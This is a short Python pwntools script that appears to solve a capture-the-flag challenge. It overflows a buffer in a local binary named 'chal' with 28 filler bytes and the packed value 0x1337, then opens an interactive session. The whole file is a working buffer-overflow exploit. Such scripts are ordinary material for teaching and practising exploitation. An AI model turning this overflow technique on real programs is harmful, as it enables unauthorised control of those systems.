from pwn import *
from binascii import *

p = process("./chal")
e = ELF("./chal")
context.binary = e

p.sendline(b"a"*28+p64(0x1337))
p.interactive()
